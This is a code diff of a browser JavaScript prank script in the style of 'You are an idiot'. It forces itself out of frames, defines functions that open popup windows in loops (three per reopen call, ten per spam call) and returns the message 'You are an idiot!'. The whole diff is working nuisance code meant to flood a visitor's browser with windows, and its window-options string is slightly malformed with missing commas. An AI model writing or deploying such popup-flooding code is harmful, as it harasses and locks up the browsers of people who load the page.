@@ -1,16 +1,21 @@
 if (top.location != location) {
   top.location.href = location.href;
 }
-function reopen() {
+function openPopup() {
   window.open(
     "popup.html",
     "",
     "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
   );
 }
+function reopen() {
+  for (var i = 0; i < 3; i++) {
+    openPopup();
+  }
+}
 function spam() {
   for (var i = 0; i < 10; i++) {
-    reopen();
+    openPopup();
   }
   return "You are an idiot!";
 }
